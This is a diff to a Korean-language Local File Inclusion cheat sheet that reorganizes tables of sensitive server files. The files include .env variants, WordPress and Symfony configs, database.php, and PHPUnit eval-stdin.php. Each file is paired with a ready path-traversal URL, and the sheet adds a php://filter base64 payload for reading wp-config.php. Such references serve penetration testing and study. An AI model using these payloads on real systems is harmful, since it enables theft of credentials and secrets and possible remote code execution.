@@ -119,16 +119,29 @@
 | `.htaccess`     | 리다이렉션, 보안 설정 등 포함 | `?page=../../../../var/www/html/.htaccess`     |
 | `/config.php.zip`                      | 압축된 설정 파일, 내부 PHP 코드 포함 가능                           | `?page=../../../../var/www/html/config.php.zip`                |
 | `/wp-config.php.bk`                    | WordPress 백업 설정 파일, DB 정보 포함                         | `?page=../../../../var/www/html/wp-config.php.bk`              |
-| `/common/config.php.new`               | 신규 PHP 설정 파일                                         | `?page=../../../../var/www/html/common/config.php.new`         |
-| `/config.php.new`                      | 신규 PHP 설정 파일                                         | `?page=../../../../var/www/html/config.php.new`                |
-| `/phpunit/src/Util/PHP/eval-stdin.php` | PHPUnit 테스트용 스크립트, stdin으로 전달된 PHP 코드 실행 가능 → RCE 위험 | `?page=../../../../vendor/phpunit/src/Util/PHP/eval-stdin.php` |
-| `/php-cgi/php-cgi.exe`                 | PHP-CGI 실행 파일, misconfiguration 시 RCE 가능             | `?page=../../../../php-cgi/php-cgi.exe`                        |
 
 > 참고: PHP에서는 소스코드가 실행되어 내용을 볼 수 없지만, `php://filter` 사용 시 Base64로 출력 가능
 
 ```
 ?page=php://filter/convert.base64-encode/resource=wp-config.php
 ```
+
+## 📘 일반 PHP / 애플리케이션 설정 파일
+
+| 📄 파일 경로                           | 🔍 설명                      | 🔐 LFI URL 예시                                       |
+| ---------------------------------- | -------------------------- | --------------------------------------------------- |
+| `/config.php.zip`                  | 압축된 설정 파일, 내부 PHP 코드 포함 가능 | `?page=../../../../config.php.zip`                  |
+| `/common/config.php.new`           | 신규 PHP 설정 파일               | `?page=../../../../common/config.php.new`           |
+| `/config.php.new`                  | 신규 PHP 설정 파일               | `?page=../../../../config.php.new`                  |
+| `/application/config/database.php` | 일반 PHP/프레임워크 DB 설정 파일      | `?page=../../../../application/config/database.php` |
+
+
+## 📘 3PHPUnit / 개발용 스크립트 (RCE 가능 후보)
+
+| 📄 파일 경로                               | 🔍 설명                                                | 🔐 LFI URL 예시                                                  |
+| -------------------------------------- | ---------------------------------------------------- | -------------------------------------------------------------- |
+| `/phpunit/src/Util/PHP/eval-stdin.php` | PHPUnit 테스트용 스크립트, stdin으로 전달된 PHP 코드 실행 가능 → RCE 위험 | `?page=../../../../vendor/phpunit/src/Util/PHP/eval-stdin.php` |
+| `/php-cgi/php-cgi.exe`                 | PHP-CGI 실행 파일, misconfiguration 시 RCE 가능             | `?page=../../../../php-cgi/php-cgi.exe`                        |
 
 
 ### 📗 Spring Boot / Java
@@ -164,18 +177,21 @@
 | `package.json` | 프로젝트 정보 및 스크립트                | `?page=../../../../package.json` |
 
 
-### 📘 Symfony / 프레임워크 설정 파일
+## 📕 Symfony
 
-| 📄 파일 경로                          | 🔍 설명                    | 🔐 LFI URL 예시                                      |
-| --------------------------------- | ------------------------ | -------------------------------------------------- |
-| `/app/config/parameters.yml.dist` | 기본 설정 템플릿                | `?page=../../../../app/config/parameters.yml.dist` |
-| `/app/config/parameters.yml`      | 실제 환경 설정, DB 비밀번호 포함 가능  | `?page=../../../../app/config/parameters.yml`      |
-| `/ADMIN/.env`                     | 환경 변수 파일, 인증 정보 포함 가능    | `?page=../../../../ADMIN/.env`                     |
-| `/.env.staging`                   | 스테이징 환경 변수 파일            | `?page=../../../../.env.staging`                   |
-| `/.env.prod`                      | 프로덕션 환경 변수 파일            | `?page=../../../../.env.prod`                      |
-| `/_config.yml`                    | YAML 형식 설정 파일            | `?page=../../../../_config.yml`                    |
-| `/config/parameters.yml`          | 실제 설정 파일, DB/환경 정보 포함 가능 | `?page=../../../../config/parameters.yml`          |
-| `/config/parameters.yml.dist`     | 설정 파일 템플릿                | `?page=../../../../config/parameters.yml.dist`     |
+| 📄 파일 경로                          | 🔍 설명                                  | 🔐 LFI URL 예시                                      |
+| --------------------------------- | -------------------------------------- | -------------------------------------------------- |
+| `/app/config/parameters.yml.dist` | 기본 설정 템플릿                              | `?page=../../../../app/config/parameters.yml.dist` |
+| `/app/config/parameters.yml`      | 실제 환경 설정, DB 비밀번호 포함 가능                | `?page=../../../../app/config/parameters.yml`      |
+| `/config/parameters.yml`          | 실제 설정 파일, DB/환경 정보 포함 가능               | `?page=../../../../config/parameters.yml`          |
+| `/config/parameters.yml.dist`     | 설정 파일 템플릿                              | `?page=../../../../config/parameters.yml.dist`     |
+| `/.env.staging`                   | 스테이징 환경용 환경 변수 파일, DB 비밀번호/API 키 포함 가능 | `?page=../../../../.env.staging`                   |
+| `/.env.bak`                       | 백업 환경 변수 파일                            | `?page=../../../../.env.bak`                       |
+| `/.env.production`                | 프로덕션 환경 변수 파일, 민감 정보 포함                | `?page=../../../../.env.production`                |
+| `/public_html/.env`               | 웹 루트에 노출된 환경 파일                        | `?page=../../../../public_html/.env`               |
+| `/.env.local`                     | 로컬 개발 환경 변수 파일                         | `?page=../../../../.env.local`                     |
+| `/ADMIN/.env`                     | 관리 폴더 환경 파일, 인증 정보 포함                  | `?page=../../../../ADMIN/.env`                     |
+| `/_config.yml`                    | YAML 형식 설정 파일                          | `?page=../../../../_config.yml`                    |
 
 
 ---
